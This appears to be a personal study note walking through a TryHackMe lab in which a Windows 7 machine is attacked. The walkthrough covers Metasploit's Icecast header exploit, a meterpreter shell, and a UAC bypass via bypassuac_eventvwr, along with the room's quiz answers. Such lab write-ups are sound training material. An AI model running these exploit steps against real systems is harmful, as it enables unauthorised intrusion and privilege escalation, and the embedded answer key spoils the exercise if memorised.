> [!check]- Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

# Exploitation
## Icecast

> [!check]- After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? If you are not familiar with metasploit, take a look at the [Metasploit](https://tryhackme.com/module/metasploit) module.
> exploit/windows/http/icecast_header

> [!check]- Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
> rhosts

Set the victim IP
```shell
setg RHOSTS 10.10.x.x
```

Set the local IP (from tun0 if you a re using VPN)
```shell
setg LHOST 10.2.x.x
```

# Privilege Escalation
Now we have a shell
> [!check]- Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
> meterpreter

```shell
getuid
```

> Dark

Gets information about the remote system, such as OS
```shell
sysinfo
```

> [!check]- What build of Windows is the system?
> 7601

> [!check]- Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
> x64

> exploit/windows/local/bypassuac_eventvwr

Check the number session
![Pasted image 20240824231014.png|500](/img/user/attachments/Pasted%20image%2020240824231014.png)
Set session number `1` 
```shell
set SESSION 1
```

```shell
setg Lhost 10.10.x.x
```

> [!check]- Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?
> LHOST

Exec `run`

> [!check]- We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?
> SeTakeOwnershipPrivilege
